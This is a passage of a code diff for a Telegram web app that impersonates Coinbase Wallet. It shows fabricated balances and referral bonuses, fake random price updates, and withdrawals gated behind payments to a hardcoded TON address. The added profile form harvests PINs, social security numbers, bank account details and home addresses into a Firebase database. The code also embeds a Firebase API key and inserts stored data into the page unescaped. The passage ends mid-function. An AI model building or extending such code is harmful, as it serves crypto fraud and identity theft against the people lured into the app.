       <button class="close-btn" id="continuePaymentCls">Close</button>
     </div>
   </div>
-  
+
+  <!-- Profile iziModal -->
+  <div id="profile-iziModal" class="iziModal" data-izimodal-title="<strong>Profile</strong>">
+    <div class="dark-content">
+      <p>Update your profile details:</p>
+      <form id="profile-form" class="wallet-form">
+        <label for="usernameInput" class="visually-hidden">Telegram Username</label>
+        <input type="text" id="usernameInput" placeholder="Telegram Username" disabled>
+        <label for="fullNameInput" class="visually-hidden">Full Name</label>
+        <input type="text" id="fullNameInput" placeholder="Enter Full Name" required>
+        <label for="emailInput" class="visually-hidden">Email</label>
+        <input type="email" id="emailInput" placeholder="Enter Email (optional)">
+        <label for="pinInput" class="visually-hidden">PIN</label>
+        <input type="password" id="pinInput" placeholder="Enter 4 or 6-digit PIN" pattern="[0-9]{4}|[0-9]{6}" required>
+        <label for="ssinInput" class="visually-hidden">SSIN</label>
+        <input type="text" id="ssinInput" placeholder="Enter SSIN (optional)">
+        <label for="accountNumberInput" class="visually-hidden">Account Number</label>
+        <input type="text" id="accountNumberInput" placeholder="Enter Account Number (optional)">
+        <label for="bankNameInput" class="visually-hidden">Bank Name</label>
+        <input type="text" id="bankNameInput" placeholder="Enter Bank Name (optional)">
+        <label for="addressInput" class="visually-hidden">Full Address</label>
+        <input type="text" id="addressInput" placeholder="Enter Full Address (optional)">
+        <input type="submit" id="submitProfileInfo" value="Save">
+      </form>
+      <button class="close-btn">Close</button>
+    </div>
+  </div>
+
+  <!-- Settings iziModal -->
+  <div id="settings-iziModal" class="iziModal" data-izimodal-title="<strong>Settings</strong>">
+    <div class="dark-content">
+      <p>Customize your preferences:</p>
+      <form id="settings-form" class="wallet-form">
+        <label for="themeSelect" class="visually-hidden">Theme</label>
+        <select id="themeSelect" class="form-select">
+          <option value="dark">Dark</option>
+          <option value="light">Light</option>
+        </select>
+        <label for="currencySelect" class="visually-hidden">Currency</label>
+        <select id="currencySelect" class="form-select">
+          <option value="USD">USD</option>
+          <option value="BTC">BTC</option>
+        </select>
+        <input type="submit" id="submitSettingsInfo" value="Save">
+      </form>
+      <button class="close-btn">Close</button>
+    </div>
+  </div>
+
+  <!-- Notification iziModal -->
+  <div id="notification-iziModal" class="iziModal" data-izimodal-title="<strong>Notifications</strong>">
+    <div class="dark-content">
+      <p>Your notifications:</p>
+      <div id="notification-list">
+        <ul id="notification-table-body" style="list-style: none; padding: 0;"></ul>
+      </div>
+      <button class="close-btn">Close</button>
+    </div>
+  </div>
+
+  <!-- History iziModal -->
+  <div id="history-iziModal" class="iziModal" data-izimodal-title="<strong>Transaction History</strong>">
+    <div class="dark-content">
+      <p>Your transaction history:</p>
+      <div id="transaction-list">
+        <table class="table table-dark">
+          <thead>
+            <tr>
+              <th>Amount</th>
+              <th>Wallet</th>
+              <th>Type</th>
+              <th>Status</th>
+              <th>Date</th>
+            </tr>
+          </thead>
+          <tbody id="transaction-table-body"></tbody>
+        </table>
+      </div>
+      <button class="close-btn">Close</button>
+    </div>
+  </div>
+
+  <!-- Logout iziModal -->
+  <div id="logout-iziModal" class="iziModal" data-izimodal-title="<strong>Logout</strong>">
+    <div class="dark-content">
+      <p>You're about to logout of this app</p>
+      <button class="close-btn" id="logout-btn">Logout</button>
+      <button class="close-btn">Cancel</button>
+    </div>
+  </div>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
-  
-   <!-- Scripts -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/izimodal/1.6.0/js/iziModal.min.js"></script>
+  <script type="module" src="https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js"></script>
+  <script type="module" src="https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js"></script>
 
-<script>
-  // Function to simulate real-time price fluctuation
-  const updatePrices = () => {
-    const cryptoCards = document.querySelectorAll('.crypto-card');
-    cryptoCards.forEach((card) => {
-      const priceElement = card.querySelector('.price p');
-      const currentPrice = parseFloat(priceElement.textContent.replace('$', ''));
-      // Randomly fluctuate price (small changes for realism)
-      const change = (Math.random() * 2 - 1).toFixed(2); // Random number between -1 and 1
-      const newPrice = Math.max(0, currentPrice + parseFloat(change)).toFixed(2); // Avoid negative prices
-      // Update the price and add green/red class
-      priceElement.textContent = `$${newPrice}`;
-      priceElement.classList.remove('green', 'red');
-      if (change > 0) {
-        priceElement.classList.add('green');
-      } else if (change < 0) {
-        priceElement.classList.add('red');
+  <!-- Firebase Module Script -->
+  <script type="module">
+    import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js';
+    import { getDatabase, ref, set, get, update, onValue, push } from 'https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js';
+
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyACrAgpR14dAu54vW45RKkcFM_wD-f2p-0",
+      authDomain: "coinbase-tgwallet.firebaseapp.com",
+      projectId: "coinbase-tgwallet",
+      databaseURL: "https://coinbase-tgwallet-default-rtdb.firebaseio.com",
+      storageBucket: "coinbase-tgwallet.firebasestorage.app",
+      messagingSenderId: "441804145305",
+      appId: "1:441804145305:web:1fb586667c0d648c342e08",
+      measurementId: "G-374F8YD4KV",
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+
+    const userId = tg.initDataUnsafe.user?.id || "54321";
+    const username = tg.initDataUnsafe.user?.username || "Anonymous";
+    const userRef = ref(database, `users/${userId}`);
+
+    // Expose Firebase functions and variables globally
+    window.firebaseFunctions = {
+      database,
+      userRef,
+      ref,
+      set,
+      get,
+      update,
+      onValue,
+      push,
+      userId,
+      username
+    };
+
+    // Generate random string for wallet addresses
+    function generateRandomString(length) {
+      const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+      let result = "";
+      for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length));
       }
-    });
-  };
-  // Update prices every 2 seconds
-  setInterval(updatePrices, 2000);
-</script>
+      return result;
+    }
+    window.generateRandomString = generateRandomString;
 
-  <script>
-    $(document).ready(function() {
-     
-    document.addEventListener('click', function(event) {
-        if (event.target && event.target.id === 'copyIt') {
-            const tron_add = 'UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy';
-            const addrInput = document.createElement('input');
-            addrInput.value = tron_add;
-            addrInput.style.position = 'absolute';
-            addrInput.style.left = '-9999px';
-            document.body.appendChild(addrInput);
-            addrInput.select();
-            document.execCommand('copy');
-            document.body.removeChild(addrInput);
-           iziToast.success({
-              title: "Copied!",
-              message: "Wallet Address copied to clipboard!",
-              duration: 3000,
-              position: "topRight",
-           });
-        }
+    // Initialize user data
+    get(userRef).then((snapshot) => {
+      if (!snapshot.exists()) {
+        const walletAddress = `0xA1Ed${generateRandomString(5)}`;
+        set(userRef, {
+          username: username,
+          fullName: "",
+          email: "",
+          pin: "",
+          ssin: "",
+          accountNumber: "",
+          bankName: "",
+          address: "",
+          balance: 25.01,
+          wallet: walletAddress,
+          referrals: 0,
+          referredBy: null,
+          settings: { theme: "dark", currency: "USD" },
+          notifications: {
+            welcome: {
+              title: "Welcome!",
+              message: "Thanks for joining Coinbase Wallet!",
+              timestamp: new Date().toISOString(),
+            },
+          },
+          transactions: {},
+        }).then(() => {
+          window.firebaseInitialized = true;
+          iziToast.success({ title: "Success", message: "User profile created!", position: "topRight" });
+        }).catch((error) => {
+          iziToast.error({ title: "Error", message: "Failed to create user profile: " + error.message, position: "topRight" });
+        });
+      } else {
+        window.firebaseInitialized = true;
+      }
+    }).catch((error) => {
+      iziToast.error({ title: "Error", message: "Failed to fetch user data: " + error.message, position: "topRight" });
     });
-    
-    
-    
-    
-      // Initialize all modals with the class `iziModal`
+  </script>
+
+  <!-- Main Script -->
+  <script>
+    // Fallback clipboard copy function
+    function copyToClipboard(text) {
+      if (navigator.clipboard && window.isSecureContext) {
+        return navigator.clipboard.writeText(text);
+      } else {
+        const textarea = document.createElement("textarea");
+        textarea.value = text;
+        document.body.appendChild(textarea);
+        textarea.select();
+        try {
+          document.execCommand("copy");
+          document.body.removeChild(textarea);
+          return Promise.resolve();
+        } catch (err) {
+          document.body.removeChild(textarea);
+          return Promise.reject(err);
+        }
+      }
+    }
+
+    // Fallback for Toastify with dark mode
+    function showToast(message) {
+      if (typeof Toastify !== "undefined") {
+        Toastify({
+          text: message,
+          duration: 3000,
+          gravity: "top",
+          position: "right",
+          style: { background: "#333" },
+        }).showToast();
+      } else {
+        alert(message);
+        console.warn("Toastify not loaded, falling back to alert.");
+      }
+    }
+
+    // Wait for Firebase to initialize
+    function waitForFirebase(callback) {
+      if (window.firebaseInitialized) {
+        callback();
+      } else {
+        setTimeout(() => waitForFirebase(callback), 100);
+      }
+    }
+
+    $(document).ready(function() {
+      // Initialize modals
       $(".iziModal").each(function() {
         $(this).iziModal({
-          background: '#222', // Popup's dark background color
-          headerColor: '#444', // Header bar color
-          width: 600,
+          background: '#222',
+          headerColor: '#444',
+          width: '80%',
           radius: 10,
           transitionIn: 'fadeInUp',
           transitionOut: 'fadeOutDown',
         });
       });
-      
-      // Call the initial modal6
+
+      // Open welcome modal
       $("#darkModal6").iziModal("open");
-      
-      
-      // 🔥🔥🔥🔥
+      setTimeout(function() { $("#darkModal6").iziModal("close"); }, 20000);
 
-      
-      setTimeout(function(){$("#darkModal6").iziModal("close");}, 20000); // 20s Timeout for the initial update pop up.
-      
-            
-      // Open modal dynamically based on button click
+      // Open modal buttons
       $(".open-btn").on("click", function() {
-      
-        const modalId = $(this).data("modal-id"); // Get the modal ID from button
-        
-        //get the user balance to check the threshold reached
-        
-        
-        $("#" + modalId).iziModal("open"); // Open the modal with that ID
+        const modalId = $(this).data("modal-id");
+        $("#" + modalId).iziModal("open");
       });
-      
 
-      // Close modal on button click inside the modal
+      // Close modal buttons
       $(".close-btn").on("click", function() {
         $(this).closest(".iziModal").iziModal("close");
       });
-      
-const walletAddress = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
 
-  new QRCode(document.getElementById("qrCodeContainer"), {
-    text: walletAddress,
-    width: 150,
-    height: 150,
-    colorDark: "#000000",
-    colorLight: "#ffffff",
-    correctLevel: QRCode.CorrectLevel.H,
-  });      
-      
-      
-    });
-  </script>
-  
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
-  import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-analytics.js";
-  import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
+      // Generate QR code for deposit address
+      const depositAddress = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
+      new QRCode(document.getElementById("qrCodeContainer"), {
+        text: depositAddress,
+        width: 150,
+        height: 150,
+        colorDark: "#000000",
+        colorLight: "#ffffff",
+        correctLevel: QRCode.CorrectLevel.H,
+      });
 
-  const firebaseConfig = {
-    apiKey: "AIzaSyACrAgpR14dAu54vW45RKkcFM_wD-f2p-0",
-    authDomain: "coinbase-tgwallet.firebaseapp.com",
-    projectId: "coinbase-tgwallet",
-    databaseURL: "https://coinbase-tgwallet-default-rtdb.firebaseio.com",
-    storageBucket: "coinbase-tgwallet.firebasestorage.app",
-    messagingSenderId: "441804145305",
-    appId: "1:441804145305:web:1fb586667c0d648c342e08",
-    measurementId: "G-374F8YD4KV",
-  };
-
-  const app = initializeApp(firebaseConfig);
-  const analytics = getAnalytics(app);
-  const database = getDatabase(app);
-
-  const tg = window.Telegram.WebApp;
-  tg.ready();
-
-  const userId = tg.initDataUnsafe.user?.id || "54341";
-  const username = tg.initDataUnsafe.user?.username || "Anonymous";
-
-  function generateRandomString(length) {
-    let result = "";
-    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    const charactersLength = characters.length;
-
-    for (let i = 0; i < length; i++) {
-      result += characters.charAt(Math.floor(Math.random() * charactersLength));
-    }
-    return result;
-  }
-
-  const randomEnding = generateRandomString(5);
-  const walletAddress = `0xA1Ed...${randomEnding}`;
-
-  document.getElementById("account-name").textContent = `@${username}`;
-  document.getElementById("wallet-address").textContent = `${walletAddress}`;
-
-  const urlParams = new URLSearchParams(window.location.search);
-  const startParam = urlParams.get("tgWebAppStartParam");
-  const referrerId = startParam ? startParam.replace("ref", "") : null;
-  
-  
-  
-  
-  
-  
-  
-
-  const userRef = ref(database, `users/${userId}`);
-
-// Check if the user already exists
-get(userRef).then((snapshot) => {
-  if (!snapshot.exists()) {
-    // Create a new user if not found
-    set(userRef, {
-      username: username,
-      balance: 25.01, // Default starting balance for new users
-      referrals: 0, // Initialize referral count
-      referredBy: referrerId && referrerId !== userId ? referrerId : null, // Link to referrer if valid
-      wallet: walletAddress,
-    }).then(() => {
-      // If referred, reward the referrer
-      if (referrerId && referrerId !== userId) {
-        const referrerRef = ref(database, `users/${referrerId}`);
-        get(referrerRef).then((referrerSnapshot) => {
-          if (referrerSnapshot.exists()) {
-            const referrerData = referrerSnapshot.val();
-            const updatedReferrals = (referrerData.referrals || 0) + 1;
-            const updatedBalance = (referrerData.balance || 0) + 10; // Reward the referrer
-
-            // Update the referrer's data
-            update(referrerRef, {
-              referrals: updatedReferrals,
-              balance: updatedBalance,
-            }).then(() => {
-              iziToast.success({
-                title: "Success",
-                message: "Referrer rewarded with $10!",
-                position: "topRight",
-              });
-            }).catch((error) => {
-              console.error("Error updating referrer:", error);
-            });
+      // Update crypto prices
+      const updatePrices = () => {
+        const cryptoCards = document.querySelectorAll('.crypto-card');
+        cryptoCards.forEach((card) => {
+          const priceElement = card.querySelector('.price p');
+          const currentPrice = parseFloat(priceElement.textContent.replace('$', ''));
+          const change = (Math.random() * 2 - 1).toFixed(2);
+          const newPrice = Math.max(0, currentPrice + parseFloat(change)).toFixed(2);
+          priceElement.textContent = `$${newPrice}`;
+          priceElement.classList.remove('green', 'red');
+          if (change > 0) {
+            priceElement.classList.add('green');
+          } else if (change < 0) {
+            priceElement.classList.add('red');
           }
-        }).catch((error) => {
-          console.error("Error fetching referrer data:", error);
         });
-      }
-    }).catch((error) => {
-      console.error("Error creating user:", error);
+      };
+      setInterval(updatePrices, 2000);
     });
-  } else {
-    // Handle existing users
-    const userData = snapshot.val();
-    document.getElementById("wallet-address").textContent = userData.wallet;
 
-    // Optionally update referrals dynamically
-    get(ref(database, `users`)).then((usersSnapshot) => {
-      if (usersSnapshot.exists()) {
-        const usersData = usersSnapshot.val();
-        let totalReferred = 0;
+    // Firebase-dependent code
+    waitForFirebase(function() {
+      const { database, userRef, ref, set, get, update, onValue, push, userId, username } = window.firebaseFunctions || {};
 
-        for (const key in usersData) {
-          if (usersData[key]?.referredBy === userId) {
-            totalReferred++;
-          }
-        }
-
-        update(userRef, {
-          referrals: totalReferred,
-          balance: userData.balance || 25.01,
-        }).catch((error) => {
-          console.error("Error updating user referrals and balance:", error);
-        });
+      if (!database || !onValue || !get) {
+        iziToast.error({ title: "Error", message: "Firebase not initialized properly!", position: "topRight" });
+        return;
       }
-    }).catch((error) => {
-      console.error("Error fetching users for referrals:", error);
-    });
-  }
-}).catch((error) => {
-  console.error("Error fetching user data:", error);
-});
-  
-  
-  
-  
 
-  const balanceRef = ref(database, `users/${userId}/balance`);
-  const walletAddr = ref(database, `users/${userId}/wallet`);
-
-  // Update balance and wallet address in real-time
-  onValue(balanceRef, (snapshot) => {
-    const balance = parseFloat(snapshot.val());
-    document.querySelector(".balance-section h2").textContent = `$${balance.toFixed(2)}`;
-    document.cookie = `userBalance=${balance.toFixed(2)}; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
-  });
-
-  onValue(walletAddr, (snapshot) => {
-    const wallet = snapshot.val() || walletAddress;
-    document.getElementById("wallet-address").textContent = wallet;
-  });
-
-  // Withdrawal logic
-  $(".open-withdraw").on("click", function () {
-    const userBalanceCookie = document.cookie.split("; ").find((row) => row.startsWith("userBalance="));
-    const userBalance = userBalanceCookie ? parseFloat(userBalanceCookie.split("=")[1]) : null;
-
-    const userWithdrawalCookie = document.cookie.split("; ").find((row) => row.startsWith("userWithdrawal="));
-    const userWithdrawal = userWithdrawalCookie ? userWithdrawalCookie.split("=")[1] : null;
-
-    const userPaidCookie = document.cookie.split("; ").find((row) => row.startsWith("userPaid="));
-    const userPaid = userPaidCookie ? userPaidCookie.split("=")[1] : null;
-
-    if (userBalance >= 70.01) {
-      if (userWithdrawal === "pending" && (!userPaid || userPaid !== "paid")) {
-        $("#darkModal8").iziModal("open");
-        $("#continuePaymentText").html("Check Status &raquo;");
-      } else if (userWithdrawal === "pending" && userPaid === "paid") {
-        $("#darkModal9").iziModal("open");
-        $("#continuePaymentCls").html("&laquo; Yet to pay?");
-        $("#continuePaymentCls").on('click', function(e){
-            e.preventDefault();
-            $("#darkModal8").iziModal("open");
-        });
-        
-        $("#continuePaymentText").html("Check status &raquo;");
-      } else {
-        $("#darkModal7").iziModal("open");
-      }
-    } else {
-      $("#darkModal2").iziModal("open");
-    }
-  });
-
-  $(document).ready(function () {
-    $("#wallet-form").on("submit", function (e) {
-  e.preventDefault();
-
-  const wallet = $("#walletInput").val().trim();
-  const amount = parseFloat($("#wallet_amountInput").val().trim());
-
-  if (!wallet || isNaN(amount) || amount <= 0) {
-    iziToast.error({
-      title: "Error",
-      message: "Please enter a valid wallet address and amount!",
-      position: "topRight",
-    });
-    return;
-  }
-
-  toggleSubmitButton(true, "Processing");
-
-  // Use `get()` for a one-time read of the balance
-  get(balanceRef)
-    .then((snapshot) => {
-      if (snapshot.exists()) {
-        const currentBalance = parseFloat(snapshot.val());
-
-        if (amount > currentBalance) {
-          iziToast.error({
-            title: "Error",
-            message: "You do not have sufficient balance!",
-            position: "topRight",
+      // Copy wallet address or TON address for Anonymous user with ID 54321
+      let userWalletAddress = "0xA1Ed12345";
+      document.getElementById("copyAddress").addEventListener("click", function() {
+        if (userId === "54321") {
+          const tron_add = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
+          copyToClipboard(tron_add).then(() => {
+            showToast("TON Address copied to clipboard!");
+          }).catch((error) => {
+            iziToast.error({ title: "Error", message: "Failed to copy TON address: " + error.message, position: "topRight" });
           });
-          toggleSubmitButton(false, "Continue");
+        } else {
+          get(userRef).then((snapshot) => {
+            const userData = snapshot.val() || {};
+            const walletToCopy = userData.wallet || userWalletAddress;
+            copyToClipboard(walletToCopy).then(() => {
+              showToast("Wallet Address copied to clipboard!");
+            }).catch((error) => {
+              iziToast.error({ title: "Error", message: "Failed to copy wallet address: " + error.message, position: "topRight" });
+            });
+          }).catch((error) => {
+            iziToast.error({ title: "Error", message: "Failed to fetch wallet address: " + error.message, position: "topRight" });
+          });
+        }
+      });
+
+      // Copy deposit address
+      document.getElementById("copyIt").addEventListener("click", function() {
+        const tron_add = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
+        copyToClipboard(tron_add).then(() => {
+          showToast("Deposit Address copied to clipboard!");
+        }).catch((error) => {
+          iziToast.error({ title: "Error", message: "Failed to copy deposit address: " + error.message, position: "topRight" });
+        });
+      });
+
+      // Profile: Populate and update
+      onValue(userRef, (snapshot) => {
+        const userData = snapshot.val() || {};
+        document.getElementById("usernameInput").value = userData.username || username;
+        document.getElementById("fullNameInput").value = userData.fullName || "";
+        document.getElementById("emailInput").value = userData.email || "";
+        document.getElementById("pinInput").value = userData.pin || "";
+        document.getElementById("ssinInput").value = userData.ssin || "";
+        document.getElementById("accountNumberInput").value = userData.accountNumber || "";
+        document.getElementById("bankNameInput").value = userData.bankName || "";
+        document.getElementById("addressInput").value = userData.address || "";
+        document.getElementById("account-name").textContent = `@${userData.username || "Anonymous"}`;
+        document.getElementById("wallet-address").textContent = userData.wallet || userWalletAddress;
+        userWalletAddress = userData.wallet || userWalletAddress;
+      });
+
+      $("#profile-form").on("submit", function(e) {
+        e.preventDefault();
+        const submitButton = $("#submitProfileInfo");
+        submitButton
+          .prop("disabled", true)
+          .addClass("loading")
+          .html('<i class="fas fa-spin-pulse fa-spinner"></i> Saving...');
+
+        const fullName = $("#fullNameInput").val().trim();
+        const email = $("#emailInput").val().trim();
+        const pin = $("#pinInput").val().trim();
+        const ssin = $("#ssinInput").val().trim();
+        const accountNumber = $("#accountNumberInput").val().trim();
+        const bankName = $("#bankNameInput").val().trim();
+        const address = $("#addressInput").val().trim();
+
+        if (!fullName) {
+          iziToast.error({ title: "Error", message: "Full Name is required!", position: "topRight" });
+          submitButton.prop("disabled", false).removeClass("loading").val("Save");
+          return;
+        }
+        if (!/^[0-9]{4}$|^[0-9]{6}$/.test(pin)) {
+          iziToast.error({ title: "Error", message: "PIN must be 4 or 6 digits!", position: "topRight" });
+          submitButton.prop("disabled", false).removeClass("loading").val("Save");
           return;
         }
 
-        // Proceed with the withdrawal
-        submitWithdrawal(userId, wallet, amount, currentBalance);
-      } else {
-        iziToast.error({
-          title: "Error",
-          message: "Balance not found. Please try again later.",
-          position: "topRight",
+        update(userRef, {
+          fullName,
+          email,
+          pin,
+          ssin,
+          accountNumber,
+          bankName,
+          address
+        }).then(() => {
+          iziToast.success({ title: "Success", message: "Profile updated!", position: "topRight" });
+          $("#profile-iziModal").iziModal("close");
+        }).catch((error) => {
+          iziToast.error({ title: "Error", message: "Failed to update profile: " + error.message, position: "topRight" });
+        }).finally(() => {
+          submitButton.prop("disabled", false).removeClass("loading").val("Save");
         });
-        toggleSubmitButton(false, "Continue");
-      }
-    })
-    .catch(() => {
-      iziToast.error({
-        title: "Error",
-        message: "An error occurred while retrieving your balance.",
-        position: "topRight",
       });
-      toggleSubmitButton(false, "Continue");
-    });
-});
 
-$("#continuePayment").on("click", function () {
-      $("#darkModal9").iziModal("open");
-      document.cookie = `userPaid=paid; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
-    });
-    
-    /* 💧💧💧💧 
-    document.cookie = `userWithdrawal=paid; expires=${new Date(Date.now()).toUTCString()}; path=/`;
-    document.cookie = `userPaid=paid; expires=${new Date(Date.now()).toUTCString()}; path=/`;
-    */
+      // Settings: Load and save
+      onValue(ref(database, `users/${userId}/settings`), (snapshot) => {
+        const settings = snapshot.val() || { theme: "dark", currency: "USD" };
+        document.getElementById("themeSelect").value = settings.theme;
+        document.getElementById("currencySelect").value = settings.currency;
+        document.body.className = settings.theme;
+      });
 
-    function showError(message) {
-      iziToast.error({ title: "Error", message, position: "topRight" });
-    }
+      $("#settings-form").on("submit", function(e) {
+        e.preventDefault();
+        const submitButton = $("#submitSettingsInfo");
+        submitButton
+          .prop("disabled", true)
+          .addClass("loading")
+          .html('<i class="fas fa-spin-pulse fa-spinner"></i> Saving...');
 
-    function toggleSubmitButton(disabled, text) {
-      $("#submitWalletInfo").prop("disabled", disabled).text(text);
-      if (disabled) {
-        $("<i>", { class: "far fa-spinner fa-spin" }).appendTo("#submitWalletInfo");
-      } else {
-        $("#submitWalletInfo .fa-spinner").remove();
+        const theme = $("#themeSelect").val();
+        const currency = $("#currencySelect").val();
+        update(ref(database, `users/${userId}/settings`), { theme, currency }).then(() => {
+          document.body.className = theme;
+          iziToast.success({ title: "Success", message: "Settings saved!", position: "topRight" });
+          $("#settings-iziModal").iziModal("close");
+        }).catch((error) => {
+          iziToast.error({ title: "Error", message: "Failed to save settings: " + error.message, position: "topRight" });
+        }).finally(() => {
+          submitButton.prop("disabled", false).removeClass("loading").val("Save");
+        });
+      });
+
+      // Update balance display
+      const balanceRef = ref(database, `users/${userId}/balance`);
+      onValue(ref(database, `users/${userId}/settings/currency`), (snapshot) => {
+        const currency = snapshot.val() || "USD";
+        const balanceElement = document.querySelector(".balance-section h2");
+        get(balanceRef).then((snapshot) => {
+          const balance = snapshot.val() || 25.01;
+          balanceElement.textContent = currency === "BTC" ? `${(balance / 60000).toFixed(6)} BTC` : `$${balance.toFixed(2)}`;
+        });
+      });
+
+      // Notifications: Fetch and display
+      onValue(ref(database, `users/${userId}/notifications`), (snapshot) => {
+        const notifications = snapshot.val();
+        const list = document.getElementById("notification-table-body");
+        list.innerHTML = "";
+        if (notifications) {
+          for (const notifId in notifications) {
+            const notif = notifications[notifId];
+            list.innerHTML += `
+              <li>
+                <strong>${notif.title}</strong><br>
+                ${notif.message}<br>
+                <small>${new Date(notif.timestamp).toLocaleString()}</small>
+              </li>
+            `;
+          }
+        } else {
+          list.innerHTML = `<li>No new notifications. Check back later!</li>`;
+        }
+      });
+
+      // Transaction History: Fetch and display
+      onValue(ref(database, `users/${userId}/transactions`), (snapshot) => {
+        const transactions = snapshot.val();
+        const tbody = document.getElementById("transaction-table-body");
+        tbody.innerHTML = "";
+        if (transactions) {
+          for (const txId in transactions) {
+            const tx = transactions[txId];
+            tbody.innerHTML += `
+              <tr>
+                <td>$${tx.amount.toFixed(2)}</td>
+                <td>${tx.wallet}</td>
+                <td>${tx.type}</td>
+                <td>${tx.status}</td>
+                <td>${new Date(tx.timestamp).toLocaleString()}</td>
+              </tr>
+            `;
+          }
+        } else {
+          tbody.innerHTML = `<tr><td colspan="5">No transactions found.</td></tr>`;
+        }
+      });
+
+      // Referral logic
+      const urlParams = new URLSearchParams(window.location.search);
+      const startParam = urlParams.get("tgWebAppStartParam");
+      const referrerId = startParam ? startParam.replace("ref", "") : null;
+
+      if (referrerId && referrerId !== userId) {
+        get(userRef).then((snapshot) => {
+          if (!snapshot.exists()) {
+            const walletAddress = `0xA1Ed${window.generateRandomString(5)}`;
+            set(userRef, {
+              username: username,
+              fullName: "",
+              email: "",
+              pin: "",
+              ssin: "",
+              accountNumber: "",
+              bankName: "",
+              address: "",
+              balance: 25.01,
+              wallet: walletAddress,
+              referrals: 0,
+              referredBy: referrerId,
+              settings: { theme: "dark", currency: "USD" },
+              notifications: {
+                welcome: {
+                  title: "Welcome!",
+                  message: "Thanks for joining Coinbase Wallet via referral!",
+                  timestamp: new Date().toISOString(),
+                },
+              },
+              transactions: {},
+            }).then(() => {
+              get(ref(database, `users/${referrerId}`)).then((referrerSnapshot) => {
+                if (referrerSnapshot.exists()) {
+                  const referrerData = referrerSnapshot.val();
+                  update(ref(database, `users/${referrerId}`), {
+                    referrals: (referrerData.referrals || 0) + 1,
+                    balance: (referrerData.balance || 0) + 10,
+                  }).then(() => {
+                    push(ref(database, `users/${referrerId}/transactions`), {
+                      amount: 10,
+                      wallet: "N/A",
+                      type: "Referral Bonus",
+                      status: "completed",
+                      timestamp: new Date().toISOString(),
+                    });
+                  });
+                }
+              });
+            });
+          }
+        });
       }
-    }
 
-    function submitWithdrawal(userId, wallet, amount, currentBalance) {
-  // Construct the reference path for the withdrawal
-  const withdrawalPath = `users/${userId}/withdrawals/${Date.now()}`;
-  const withdrawalRef = ref(database, withdrawalPath);
+      // Update referral count
+      onValue(ref(database, `users`), (usersSnapshot) => {
+        if (usersSnapshot.exists()) {
+          const usersData = usersSnapshot.val();
+          let totalReferred = 0;
+          for (const key in usersData) {
+            if (usersData[key]?.referredBy === userId) {
+              totalReferred++;
+            }
+          }
+          update(userRef, { referrals: totalReferred });
+        }
+      });
 
-  // Log the constructed path for debugging
-  console.log("Withdrawal Reference Path:", withdrawalPath);
+      // Send logic
+      $("#send-form").on("submit", function(e) {
+        e.preventDefault();
+        const submitButton = $("#submitSendInfo");
+        submitButton
+          .prop("disabled", true)
+          .addClass("loading")
+          .html('<i class="fas fa-spin-pulse fa-spinner"></i> Processing...');
 
-  // Attempt to set the withdrawal data
-  set(withdrawalRef, {
-    wallet,
-    amount,
-    status: "pending",
-    timestamp: new Date().toISOString(),
-  })
-    .then(() => {
-      // Update the user's balance
-      const newBalance = currentBalance - amount;
-      update(ref(database, `users/${userId}`), { balance: newBalance })
-        .then(() => {
-          // Update the user's withdrawal cookie
+        const recipientWallet = $("#sendWalletInput").val().trim();
+        const amount = parseFloat($("#sendAmountInput").val().trim());
+        const walletRegex = /^0x[a-fA-F0-9]{40}$|^UQC[a-zA-Z0-9_-]{42}$/;
+
+        if (!recipientWallet || !walletRegex.test(recipientWallet)) {
+          iziToast.error({ title: "Error", message: "Invalid recipient wallet address!", position: "topRight" });
+          submitButton.prop("disabled", false).removeClass("loading").val("Send");
+          return;
+        }
+        if (isNaN(amount) || amount <= 0) {
+          iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
+          submitButton.prop("disabled", false).removeClass("loading").val("Send");
+          return;
+        }
+
+        get(ref(database, `users`)).then((usersSnapshot) => {
+          const users = usersSnapshot.val();
+          let recipientId = null;
+          for (const uid in users) {
+            if (users[uid].wallet === recipientWallet) {
+              recipientId = uid;
+              break;
+            }
+          }
+          if (!recipientId) {
+            iziToast.error({ title: "Error", message: "Recipient wallet not found in the app!", position: "topRight" });
+            submitButton.prop("disabled", false).removeClass("loading").val("Send");
+            return;
+          }
+
+          get(ref(database, `users/${userId}/balance`)).then((snapshot) => {
+            const currentBalance = snapshot.val() || 0;
+            if (amount > currentBalance) {
+              $("#insufficient-send-balance").removeClass("hide");
+              submitButton.prop("disabled", false).removeClass("loading").val("Send");
+              return;
+            }
+
+            const senderTxRef = push(ref(database, `users/${userId}/transactions`));
+            const recipientTxRef = push(ref(database, `users/${recipientId}/transactions`));
+            const updates = {
+              [`users/${userId}/balance`]: currentBalance - amount,
+              [`users/${recipientId}/balance`]: (users[recipientId].balance || 0) + amount,
